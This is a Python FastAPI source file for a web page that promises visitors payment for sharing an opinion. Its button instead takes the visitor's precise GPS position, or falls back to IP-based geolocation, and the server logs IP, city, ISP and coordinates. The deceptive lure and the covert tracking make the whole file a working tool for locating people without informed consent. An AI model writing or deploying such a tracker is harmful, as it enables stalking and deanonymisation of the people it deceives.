from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
import requests

app = FastAPI()

# ===========================
# Serve the main page with Google Maps
# ===========================
@app.get("/locate", response_class=HTMLResponse)
async def locate_page():
    """
    Main page that asks the user to share location.
    Shows location on Google Maps if available, falls back to IP-based location.
    """
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Share Your Opinion</title>
        <style>
            #map { height: 400px; width: 100%; margin-top: 20px; }
            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
            button { font-size: 18px; padding: 10px 20px; }
        </style>
    </head>
    <body>
        <h2>Click the button to share your opinion to get paid</h2>
        <button onclick="shareLocation()">Share Opinion</button>
        <div id="map"></div>

        <script>
        let map, marker;

        function initMap(lat=0, lon=0) {
            const location = { lat: lat, lng: lon };
            map = new google.maps.Map(document.getElementById("map"), {
                zoom: lat && lon ? 12 : 2,
                center: location
            });
            marker = new google.maps.Marker({ position: location, map: map });
        }

        async function shareLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async pos => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        await fetch('/gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ lat, lon })
                        });
                        alert("Location sent successfully (GPS)!");
                        initMap(lat, lon);
                    },
                    async err => {
                        // Fallback to IP-based
                        const response = await fetch('/track');
                        const data = await response.json();
                        alert("Location sent (IP-based)!");
                        initMap(parseFloat(data.latitude) || 0, parseFloat(data.longitude) || 0);
                    }
                );
            } else {
                // Browser does not support GPS
                const response = await fetch('/track');
                const data = await response.json();
                alert("Location sent (IP-based)!");
                initMap(parseFloat(data.latitude) || 0, parseFloat(data.longitude) || 0);
            }
        }

        // Initialize empty map at first
        initMap();
        </script>

        <!-- Google Maps JS API -->
        <script async
        src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&callback=initMap">
        </script>
    </body>
    </html>
    """

# ===========================
# Track user via IP fallback
# ===========================
@app.get("/track")
async def track_ip(request: Request):
    """
    Capture location using IP address if GPS not available
    """
    ip = request.client.host
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
    except Exception:
        geo = {}

    data = {
        "ip": ip,
        "country": geo.get("country", "Unknown"),
        "region": geo.get("regionName", "Unknown"),
        "city": geo.get("city", "Unknown"),
        "isp": geo.get("isp", "Unknown"),
        "latitude": geo.get("lat", 0),
        "longitude": geo.get("lon", 0)
    }

    print("IP LOCATION:", data)
    return JSONResponse(data)

# ===========================
# Track GPS location
# ===========================
@app.post("/gps")
async def gps_location(data: dict, request: Request):
    """
    Capture precise GPS location sent from the browser
    """
    ip = request.client.host
    location_data = {
        "ip": ip,
        "latitude": data.get("lat"),
        "longitude": data.get("lon")
    }

    print("GPS LOCATION:", location_data)
    return JSONResponse(location_data)

